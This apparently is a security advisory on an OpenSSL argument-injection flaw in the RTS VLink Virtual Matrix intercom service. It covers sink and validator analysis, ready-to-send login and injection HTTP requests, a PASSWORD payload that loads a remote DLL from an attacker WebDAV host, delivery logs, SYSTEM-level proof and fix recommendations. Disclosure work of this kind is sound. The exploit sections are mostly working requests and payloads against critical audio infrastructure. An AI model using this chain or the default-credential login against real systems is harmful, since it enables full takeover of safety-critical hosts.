# RTS Intercom VLink Virtual Matrix — OpenSSL Argument Injection → SYSTEM RCE

## 1. Research Target & Attack Surface

RTS Intercom / VLink Virtual Matrix 6.60 (Bosch/Keenfinity) is a broadcast/intercom virtual-matrix system used in CII audio infrastructure — the kind of system that connects control rooms, public-address networks, and intercom endpoints in facilities where availability is safety-critical. The Web service `VirtualMatrix-As-Service.exe` is a C++ PE32+ x64 binary using the Wt (Web Toolkit) C++ HTTP framework, running as **NT AUTHORITY\SYSTEM** on Windows Server and listening on HTTP 80 by default (bound 0.0.0.0).

Relevant surface:

| Endpoint | Purpose | Auth |
|---|---|---|
| `POST /api/v1/authentication` | Login | None (login itself) |
| `POST /api/v1/ssl/generatetlsclientcertificate` | PKCS12 certificate generation | Admin token — **injection sink** |
| `POST /api/v1/ssl/generatecsr` / `generatecrt` | CSR/cert generation | Admin token (`.bat`-mediated shell injection) |

Login returns a server-side session token (`POST /api/v1/authentication` → `AUTHORIZATION` header), and the factory default credential is `admin:admin` (CWE-798). The six unauthenticated endpoints (login plus read-only info) carry no sink, so the vulnerability is reached with an admin token — verified with a changed custom password to prove it does not depend on the default credential.

## 2. Sink Identification: The Only Command-Execution Primitive

An import-table scan of `VirtualMatrix-As-Service.exe` found exactly one command-execution primitive: `ShellExecuteExW` (12 call sites; no `CreateProcess`/`WinExec`/`system`/`popen`). The SSL resource handler `CSslApiResource` accounts for 5 of them. Sites 3/4 (generatetlsclientcertificate, pkcs12 export) invoke `openssl.exe` **directly** — no `cmd.exe` mediation — which means the injection surface is argument injection, not shell injection.

The command line is built by a bare `vswprintf` wrapper (`fcn.1400b2b40`) with no escaping:

```c
swprintf(buf,
  L"pkcs12 -export -out %S -inkey %S -in %S -chain -CAfile %S "
  L"-passin pass:%s -passout pass:%s -name %s",
  outPath, keyPath, inPath, caPath,
  PASSWORD,   // 5th %s — unquoted, attacker-controlled
  PASSWORD,   // 6th %s (passout)
  commonName  // 7th %s (name)
);
// ShellExecuteExW(lpFile="openssl.exe", lpParameters=buf)
```

`PASSWORD` lands in `-passin pass:%s` unquoted; spaces split the openssl argv (CWE-78 argument injection).

## 3. Source Identification: PASSWORD Field and Its Validator Blind Spot

`POST /api/v1/ssl/generatetlsclientcertificate` reads 8 JSON fields: COMMON_NAME, ORGANIZATION, ORGANIZATIONAL_UNIT, COUNTRY, STATE_REGION, DOMAIN_NAME_SERVERS, SIP_CLIENT_LOGIN_NAME, PASSWORD.

The validator (`0x140135b10`) blocks only `&` (0x26), `,` (0x2c), `"` (0x22), and `>` (0x3e). It does **not** block space, `-`, `:`, `\`, `/`, `|`, or `.`. The payload `evil -engine \\<attacker>@<port>\DavWWWRoot\evil.dll` passes validation untouched — the validator was written for a different threat model and misses argument injection entirely.

## 4. The Technique: OpenSSL Dynamic-Engine Remote DLL Load

OpenSSL 1.1.1 supports dynamic engine loading via `-engine`. When `ENGINE_by_id(name)` finds no built-in engine, the fallback sets `SO_PATH=<name>` and `LOAD`, which calls `DSO_load` → `LoadLibraryW(<name>)`. The Windows loader runs `DllMain(DLL_PROCESS_ATTACH)` **before export-table validation**, so a DLL loaded from a UNC path executes immediately.

The UNC path is resolved by the Windows WebClient (WebDAV MiniRedir) to HTTP:

```
\\<attacker>@8899\DavWWWRoot\evil.dll
  → http://<attacker>:8899/DavWWWRoot/evil.dll  (OPTIONS/PROPFIND/GET)
```

Two delivery caveats shaped the PoC:
1. openssl prepends its `ENGINESDIR` (with spaces: `C:\Program Files\FireDaemon OpenSSL\lib\engines-1_1\`) to the engine name → the WebDAV URL needs `%20` encoding for the space.
2. wsgidav's OPTIONS handler doesn't decode `%20` (404) while GET/PROPFIND do — inconsistent behavior aborts WebClient. The PoC ships a catch-all WebDAV server that decodes `%20` consistently and serves the DLL for any path → target-agnostic.

The same primitive works over SMB (`\\<attacker>\share\evil.dll`, LanmanWorkstation default-on); the WebDAV/HTTP variant keeps the whole chain HTTP.

## 5. End-to-End Data Flow

```
POST /api/v1/ssl/generatetlsclientcertificate
  Authorization: <admin token>
  {"PASSWORD":"evil -engine \\\\<attacker>@8899\\DavWWWRoot\\evil.dll", ...}
    → CSslApiResource::handlePostRequest → validator (passes — no space/-/\ rejection)
    → fcn.1400b2b40 builds the openssl command line
    → ShellExecuteExW(lpFile="openssl.exe", lpParameters=<string>)
    → openssl pkcs12 parses -engine as an independent argv token
    → setup_engine: ENGINE_by_id NULL → dynamic-engine fallback → SO_PATH=<name> LOAD
    → DSO_load → LoadLibraryW(UNC path)
    → Windows WebClient maps UNC → http://<attacker>:8899/... (WebDAV)
    → victim GETs evil.dll → DllMain(DLL_PROCESS_ATTACH) fires
    → arbitrary code as NT AUTHORITY\SYSTEM
```

## 6. Exploit Construction

**Step 1 — login:**

```http
POST /api/v1/authentication HTTP/1.1
Host: <TARGET_IP>:80
Content-Type: application/json

{"LOGIN_NAME":"admin","LOGIN_PASSWORD":"<password>"}
```

Response 200 contains `AUTHORIZATION: <token>` (ACCESS_LEVEL:0).

**Step 2 — inject:**

```http
POST /api/v1/ssl/generatetlsclientcertificate HTTP/1.1
Host: <TARGET_IP>:80
Authorization: <token>
Content-Type: application/json

{"COMMON_NAME":"test","ORGANIZATION":"test","ORGANIZATIONAL_UNIT":"test",
 "COUNTRY":"US","STATE_REGION":"MN","DOMAIN_NAME_SERVERS":"127.0.0.1",
 "SIP_CLIENT_LOGIN_NAME":"test",
 "PASSWORD":"evil -engine \\\\<ATTACKER_IP>@8899\\DavWWWRoot\\evil.dll"}
```

Response 200 + PKCS12 binary data (openssl ran; the engine-load side effect fired DllMain).

**Step 3 — victim-side delivery log:**

```
<victim> OPTIONS /Program%20Files/FireDaemon%20OpenSSL/lib/engines-1_1/DavWWWRoot/evil.dll -> 200
<victim> PROPFIND /Program%20Files/FireDaemon%20OpenSSL/lib/engines-1_1/DavWWWRoot/evil.dll -> 207
<victim> GET /Program%20Files/FireDaemon%20OpenSSL/lib/engines-1_1/evil.dll -> 200
```

## 7. Dynamic Verification

Verified twice on VLink Virtual Matrix 6.60 (Windows, service as SYSTEM, custom non-default password):

1. Login → admin token.
2. Inject `-engine \\<attacker>@8899\DavWWWRoot\evil.dll` via PASSWORD.
3. Victim HTTP GET of evil.dll from the catch-all WebDAV server.
4. `DllMain` → marker files; `whoami` = `nt authority\system`:

```
C:\Windows\Temp\pwn_rce_engine.txt:
  RCE via openssl -engine UNC argument injection
  DllMain DLL_PROCESS_ATTACH fired
  RCE_ENGINE_OK

C:\Windows\Temp\pwn_rce_whoami.txt:  nt authority\system
```

Both a manual PowerShell trigger and the Python PoC reproduced the result. The PoC implements login, injection, and the catch-all WebDAV server in one tool.

## 8. Reachability & Impact

- **Network**: any host that can reach the VLink HTTP port (default 80)
- **Auth**: admin login; factory default `admin:admin` (CWE-798)
- **Delivery**: attacker-controlled WebDAV/HTTP server (no MITM); SMB alternative
- **Privilege**: `NT AUTHORITY\SYSTEM` (service runs as LocalSystem)

The impact is authenticated admin → SYSTEM RCE (privilege escalation to OS maximum) on the intercom/matrix host — full compromise of CII audio infrastructure and the host OS.

## 9. Fix Recommendations

1. Build the openssl command with a strict argv array (`CreateProcessW` + lpCommandLine array) or use `-passin file:<tmpfile>` / `-passin stdin`
2. Harden the validator: reject space, `-`, `\`, `/`, `|` in `PASSWORD` (or whitelist alphanumerics)
3. Do not run the Web service as LocalSystem; use a least-privilege account
4. Remove/rotate the factory default `admin:admin`
